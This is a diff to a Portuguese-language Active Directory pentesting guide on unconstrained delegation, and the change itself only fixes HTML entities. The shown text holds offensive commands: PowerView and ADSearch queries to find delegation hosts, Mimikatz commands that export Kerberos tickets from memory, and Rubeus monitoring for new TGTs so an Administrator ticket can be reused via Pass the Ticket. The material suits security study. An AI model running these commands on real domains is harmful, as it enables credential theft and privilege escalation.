@@ -14,14 +14,14 @@ Você pode **encontrar objetos de Computador com esse atributo** verificando se 
 ## Powerview
 Get-NetComputer -Unconstrained #DCs sempre aparecem, mas não são úteis para privesc
 <strong>## ADSearch
-</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
+</strong>ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
 <strong># Exportar tickets com Mimikatz
 </strong>privilege::debug
 sekurlsa::tickets /export #Forma recomendada
 kerberos::list /export #Outra forma
 
 # Monitorar logins e exportar novos tickets
-.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Verificar a cada 10s por novos TGTs</code></pre>
+.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Verifique a cada 10s por novos TGTs</code></pre>
 
 Carregue o ticket de Administrador (ou usuário vítima) na memória com **Mimikatz** ou **Rubeus para um** [**Pass the Ticket**](pass-the-ticket.md)**.**\
 Mais informações: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
